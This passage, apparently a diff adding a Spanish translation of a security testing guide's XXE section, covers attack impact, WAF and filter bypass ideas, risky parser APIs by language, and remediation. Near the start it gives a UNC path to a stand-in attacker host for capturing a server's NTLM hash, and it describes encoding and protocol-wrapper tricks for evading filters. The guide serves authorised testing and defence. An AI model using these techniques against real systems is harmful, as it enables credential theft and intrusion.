+<li><strong>Captura de credenciales mediante rutas UNC (Windows).</strong> En analizadores alojados en Windows, apuntar una entidad a una ruta UNC (<code>file://///attacker-ip/share/x</code>) puede hacer que el servidor intente autenticarse por SMB contra un listener controlado por el evaluador, filtrando el hash NTLM de la cuenta de servicio para su descifrado sin conexión.</li>
+</ul>
+<p>Estos impactos deben reflejarse en cómo se puntúa la severidad de un hallazgo, según los Objetivos de la prueba anteriores: un XXE ciego de solo lectura de archivos y un XXE que produce credenciales de la nube son hallazgos muy diferentes aunque el punto de inyección sea idéntico.</p>
+<h3 id="filter-and-waf-bypass-techniques">Técnicas de elusión de filtros y WAF</h3>
+<p>Si los payloads <code>&lt;!DOCTYPE</code> sencillos están siendo bloqueados o eliminados, vale la pena probar las siguientes variaciones antes de concluir que la aplicación no es vulnerable:</p>
+<ul>
+<li><strong>Codificación del payload:</strong> algunos analizadores aceptan codificaciones de entrada alternativas (p. ej., UTF-7) que no contienen las secuencias de bytes literales que un filtro está buscando, pero que aun así son decodificadas y analizadas como XML por la biblioteca subyacente antes de que se ejecute cualquier lógica de filtrado. Recodificar todo el payload puede eludir filtros ingenuos basados en firmas que solo buscan <code>&lt;!DOCTYPE</code> o <code>&lt;!ENTITY</code> en texto plano.</li>
+<li><strong>URI de datos (<code>data:</code>):</strong> cuando el manejo de protocolos del analizador lo permite, se puede introducir de contrabando un payload codificado en base64 mediante una entidad de parámetro <code>data:text/plain;base64,...</code>, manteniendo el contenido real de la DTD fuera de la petición en forma de texto plano.</li>
+<li><strong>Wrappers de protocolo alternativos en lugar de <code>file://</code>:</strong> en pilas basadas en PHP, wrappers como <code>php://filter/convert.base64-encode/resource=</code> eluden los filtros ingenuos de cadenas <code>file://</code> y resuelven el problema aparte de exfiltrar contenido binario o de varias líneas (véase la nota sobre exfiltración OOB más arriba). En pilas basadas en Java, el protocolo <code>jar:</code> puede usarse para alcanzar archivos dentro de un archivo ZIP/JAR, incluido uno obtenido desde una URL remota, y es útil cuando el acceso directo <code>file://</code> está bloqueado pero el acceso basado en archivos comprimidos no.</li>
+<li><strong>Dividir la confianza entre dos codificaciones:</strong> un pequeño número de analizadores decodificarán referencias numéricas de caracteres HTML dentro del valor de una entidad antes de volver a analizarlo como un fragmento de DTD; donde esto se aplique, expresar las palabras clave bloqueadas como referencias numéricas de caracteres puede pasar desapercibido para un filtro que solo reconoce la cadena literal.</li>
+</ul>
+<p>Como siempre con las elusiones de filtros, se debe confirmar que el analizador/versión subyacente realmente exhibe el comportamiento en el que se confía, en lugar de asumir que alguna de las anteriores funciona universalmente: son pistas para probar, no elusiones garantizadas.</p>
+<h3 id="a-note-on-modern-parser-defaults">Una nota sobre los valores por defecto de los analizadores modernos</h3>
+<p>Muchas bibliotecas y frameworks de análisis XML actuales se distribuyen con la resolución de entidades externas deshabilitada por defecto, o proporcionan un indicador documentado de &quot;procesamiento seguro&quot; cuyo uso real los evaluadores deben confirmar (esto <strong>no</strong> significa que se puedan omitir las pruebas de XXE; véase la <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">XML External Entity (XXE) Prevention Cheat Sheet</a>). En la práctica, el XXE explotable hoy en día se encuentra con mayor frecuencia donde:</p>
+<ul>
+<li>Un analizador se configuró de forma segura para la API principal de la aplicación, pero una ruta de código secundaria (procesamiento de carga de archivos, conversión de documentos, generación de informes, endpoint SOAP heredado) utiliza una instancia de analizador diferente y sin endurecer.</li>
+<li>Las DTD están deshabilitadas pero el procesamiento de XInclude se dejó habilitado (normalmente son indicadores de configuración independientes).</li>
+<li>Una biblioteca de terceros o una dependencia incorpora su propio análisis XML con valores por defecto inseguros.</li>
+<li>Todavía se utilizan analizadores más antiguos o construidos a medida (dispositivos embebidos, pilas heredadas de Java/C).</li>
+</ul>
+<p>Por lo tanto, los evaluadores deben probar cada ruta de código que consume XML de forma independiente, en lugar de asumir que asegurar un endpoint de la API asegura toda la aplicación.</p>
+<h2 id="white-box-testing">Pruebas de caja blanca</h2>
+<p>Al revisar el código fuente, se debe comprobar si los analizadores XML están configurados de forma segura para deshabilitar <code>DOCTYPE</code>, las DTD externas y las entidades de parámetro externas.</p>
+<p>Para obtener fragmentos completos de configuración segura para todos los lenguajes, consulte la <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a>.</p>
+<h3 id="java">Java</h3>
+<p>Las siguientes APIs de Java pueden ser vulnerables a XXE si no se configuran correctamente:</p>
+<ul>
+<li><code>javax.xml.parsers.DocumentBuilder</code> / <code>DocumentBuilderFactory</code></li>
+<li><code>javax.xml.parsers.SAXParser</code> / <code>SAXParserFactory</code></li>
+<li><code>javax.xml.stream.XMLInputFactory</code></li>
+<li><code>javax.xml.transform.TransformerFactory</code> / <code>SAXTransformerFactory</code></li>
+<li><code>org.xml.sax.XMLReader</code> / <code>EntityResolver</code></li>
+<li><code>org.dom4j.io.SAXReader</code></li>
+<li><code>org.jdom2.input.SAXBuilder</code></li>
+<li><code>Xerces</code>: <code>DOMParser</code>, <code>SAXParser</code>, <code>XMLParser</code></li>
+</ul>
+<blockquote>
+<p><strong>Nota:</strong> las bibliotecas de terceros que procesan formatos basados en XML (como Apache POI para documentos OOXML) también pueden introducir vulnerabilidades XXE y XEE. Al revisar el código, se deben buscar palabras clave de vulnerabilidades históricas como <code>XSSFExportToXml</code> o configuraciones SAX de OPC inseguras. Siempre se debe verificar la versión de la biblioteca frente a los avisos de seguridad conocidos (p. ej., <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-22766/Apache-POI.html" target="_blank" rel="noopener">Apache POI CVE Details</a>) en lugar de asumir que son seguras por defecto.</p>
+</blockquote>
+<h3 id="c--c">C / C++</h3>
+<p>Las siguientes palabras clave del código fuente pueden indicar implementaciones vulnerables:</p>
+<ul>
+<li><strong>libxml2:</strong> <code>xmlCtxtReadMemory</code>, <code>xmlCtxtUseOptions</code>, <code>xmlParseInNodeContext</code>, <code>xmlReadDoc</code>, <code>xmlReadFd</code>, <code>xmlReadFile</code>, <code>xmlReadIO</code>, <code>xmlReadMemory</code>, <code>xmlCtxtReadDoc</code>, <code>xmlCtxtReadFd</code>, <code>xmlCtxtReadFile</code>, <code>xmlCtxtReadIO</code></li>
+<li><strong>libxerces-c:</strong> <code>XercesDOMParser</code>, <code>SAXParser</code>, <code>SAX2XMLReader</code></li>
+</ul>
+<h3 id="python">Python</h3>
+<p>Se deben revisar los siguientes paquetes y funciones:</p>
+<ul>
+<li><code>xml.etree.ElementTree</code> y <code>xml.dom.minidom</code>: aunque no expanden entidades externas por defecto en las versiones actuales de CPython, aún pueden ser susceptibles a denegación de servicio (DoS) por expansión de entidades y otros casos límite.</li>
+<li><code>lxml</code>: se comprueba si el analizador se instancia explícitamente con <code>resolve_entities=True</code> (y <code>no_network=False</code>), lo que habilita XXE.</li>
+<li><strong>Recomendación:</strong> <code>defusedxml</code> es el reemplazo directo estándar de los módulos XML de la biblioteca estándar para mitigar de manera uniforme los riesgos de XXE y DoS.</li>
+</ul>
+<h3 id="nodejs--javascript">Node.js / JavaScript</h3>
+<p>Se buscan bibliotecas heredadas o configuradas de forma laxa:</p>
+<ul>
+<li><code>libxmljs</code>: la sustitución de entidades externas está desactivada por defecto; se busca una opción explícita <code>{ noent: true }</code>, que la vuelve a habilitar.</li>
+<li><code>xml2js</code>: esta biblioteca se basa internamente en analizadores de JavaScript puro como <code>sax-js</code>. Aunque no resuelve entidades externas por defecto, puede ser vulnerable a ataques de DoS. Se comprueba si la opción <code>strict</code> está establecida explícitamente en <code>false</code>.</li>
+<li><code>xml2json</code>: este módulo utiliza internamente <code>node-expat</code> (bindings C/C++ para el analizador Expat). Aunque Expat generalmente es seguro frente a XXE clásico de divulgación de archivos de forma predeterminada, puede ser susceptible a la expansión de entidades XML (DoS) si no se restringe explícitamente.</li>
+<li><code>xmldom</code>: se revisa cualquier configuración explícita de resolución de entidades, ya que su comportamiento y capacidades por defecto han variado históricamente entre versiones.</li>
+</ul>
+<h2 id="remediation">Corrección</h2>
+<p>La solución más fiable para los problemas de la clase XXE es eliminar por completo la capacidad del analizador de resolver recursos externos, en lugar de intentar filtrar o sanear la entrada XML. Principios generales, en orden de prioridad:</p>
+<ul>
+<li><strong>Deshabilitar por completo el procesamiento de DTD</strong> siempre que la aplicación no tenga una necesidad de negocio genuina de él. La mayor parte del XML de las aplicaciones (payloads de API, cargas de configuración, envíos de formularios convertidos a XML) nunca necesita legítimamente un DOCTYPE.</li>
+<li>Si las DTD no pueden deshabilitarse por completo, <strong>deshabilitar la resolución de entidades generales y de parámetro externas</strong>, y <strong>deshabilitar el procesamiento de XInclude</strong>; normalmente son indicadores independientes del interruptor de DTD, por lo que desactivar uno no garantiza que el otro esté desactivado.</li>
+<li>Preferir las APIs/indicadores de configuración del analizador descritos como de &quot;procesamiento seguro&quot; cuando estén disponibles, pero verificar qué cubre realmente ese indicador para el analizador/versión específico en uso, en lugar de asumir que deshabilita todo lo anterior.</li>
+<li>Aplicar esta configuración a <strong>cada</strong> instanciación de analizador en el código base y sus dependencias, no solo a la capa de API principal; el manejo de carga de archivos, la conversión de documentos/generación de vistas previas, los trabajos de importación/exportación, los clientes SOAP y las bibliotecas de terceros crean cada uno sus propias instancias de analizador y deben comprobarse de forma independiente.</li>
+<li>Cuando las entidades externas sean un requisito genuino, implementar una <strong>lista de permitidos</strong> estricta de URI/esquemas permitidos en lugar de depender de una <strong>lista de bloqueo</strong> (deny-list) para protocolos peligrosos como <code>file://</code>, <code>ftp://</code>, etc.</li>
+<li>Aplicar defensa en profundidad: ejecutar los procesos de análisis XML con el mínimo privilegio (sin acceso a archivos sensibles, sin acceso a la red saliente donde no sea necesario) y mantener parcheadas las bibliotecas XML, ya que los valores por defecto a nivel de analizador y las elusiones conocidas cambian entre versiones.</li>
+</ul>
+<p>Referencia rápida por ecosistema (verifique con la documentación actual para la biblioteca/versión exacta en uso, ya que los valores por defecto han cambiado con el tiempo y varían según la biblioteca):</p>
+<ul>
+<li><strong>Java</strong>: configure <code>DocumentBuilderFactory</code>/<code>SAXParserFactory</code>/<code>XMLInputFactory</code>/<code>TransformerFactory</code> (y los analizadores basados en <code>Xerces</code>) para deshabilitar las declaraciones DOCTYPE, las entidades generales/de parámetro externas y XInclude.</li>
+<li><strong>.NET</strong>: use <code>XmlReaderSettings</code> con <code>DtdProcessing</code> establecido en <code>Prohibit</code> y <code>XmlResolver</code> establecido en <code>null</code> (o un resolvedor personalizado restrictivo).</li>
+<li><strong>Python</strong>: prefiera una biblioteca de análisis endurecida (p. ej., <code>defusedxml</code>) en lugar de los módulos XML de la biblioteca estándar directamente; para <code>lxml</code>, deje explícitamente <code>resolve_entities</code> en su valor seguro por defecto (o establézcalo en <code>False</code>) y evite habilitar el acceso a la red en el analizador.</li>
+<li><strong>PHP</strong>: en PHP 8.0+, <code>libxml_disable_entity_loader()</code> está obsoleta y es en gran medida innecesaria: PHP ahora requiere libxml &gt;= 2.9.0, que deshabilita por defecto la sustitución de entidades externas, por lo que un análisis estándar basado en <code>DOMDocument</code>/<code>SimpleXML</code>/<code>libxml</code> en una versión actual de PHP no es explotable mediante la vía clásica de entidades a menos que el código la rehabilite explícitamente (p. ej., mediante <code>LIBXML_NOENT</code> combinado con <code>LIBXML_DTDLOAD</code>). Por lo tanto, los evaluadores deben buscar indicadores explícitos de reactivación en PHP moderno en lugar de asumir que el framework necesita una llamada de desactivación; en PHP &lt; 8.0 con libxml más antiguo, la llamada de desactivación sigue siendo necesaria. En cualquier caso, trate por separado las funcionalidades de carga de archivos/conversión de documentos que llaman a bibliotecas de terceros, ya que estas pueden incluir su propio analizador configurado de forma diferente.</li>
+<li><strong>Node.js</strong>: para el análisis basado en <code>libxmljs</code>, nunca establezca <code>noent: true</code> con entradas no confiables; prefiera omitir la opción (o establecerla en <code>false</code>) y combínela con <code>nonet: true</code> para bloquear también la resolución de entidades basada en la red.</li>
+<li><strong>C/C++ (libxml2)</strong>: evite las opciones que habilitan la carga de red/entidades (p. ej., <code>XML_PARSE_NOENT</code>, <code>XML_PARSE_DTDLOAD</code>) a menos que sean explícitamente necesarias.</li>
+</ul>
+<p>Para fragmentos de configuración autorizados y específicos de cada analizador, remítase a la <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">XML External Entity (XXE) Prevention Cheat Sheet</a>, que se mantiene por separado y se actualiza a medida que cambia el comportamiento de los analizadores.</p>
+<h2 id="tools">Herramientas</h2>
+<ul>
+<li><a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt" target="_blank" rel="noopener">XML Injection Fuzz Strings (from wfuzz tool)</a></li>
+<li><a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">dtd-finder</a> - una lista de rutas de archivos DTD locales conocidas, más un escáner que puede enumerar las DTD presentes en un sistema de archivos o dentro de un contenedor/imagen Docker, útil para la técnica de reutilización de DTD locales descrita arriba.</li>
+</ul>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="https://portswigger.net/kb/issues/00100700_xml-injection" target="_blank" rel="noopener">PortSwigger: XML injection</a></li>
+<li><a href="https://seclists.org/bugtraq/2002/Oct/420" target="_blank" rel="noopener">Gregory Steuck, &quot;XXE (XML eXternal Entity) attack&quot;</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP XXE Prevention Cheat Sheet</a></li>
+<li><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">PortSwigger Web Security Academy - XML External Entity (XXE) Injection</a></li>
+<li><a href="https://portswigger.net/web-security/xxe/blind" target="_blank" rel="noopener">PortSwigger Web Security Academy - Blind XXE</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank" rel="noopener">HackTricks - XXE / XEE</a></li>
+</ul>
